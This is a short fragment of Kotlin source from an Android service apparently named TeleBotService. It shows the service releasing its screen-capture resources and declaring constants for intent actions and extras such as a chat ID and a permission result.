        virtualDisplay?.release(); virtualDisplay = null
        imageReader?.close(); imageReader = null
        mediaProjection?.stop(); mediaProjection = null
    }

    companion object {
        const val TAG = "TeleBotService"
        const val ACTION_MEDIA_PROJECTION = "com.hpu.telebotmon.MEDIA_PROJECTION"
        const val ACTION_PERMISSION_RESULT = "com.hpu.telebotmon.PERMISSION_RESULT"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        const val EXTRA_CHAT_ID = "chat_id"
        const val EXTRA_PERMISSION = "permission"
    }
}
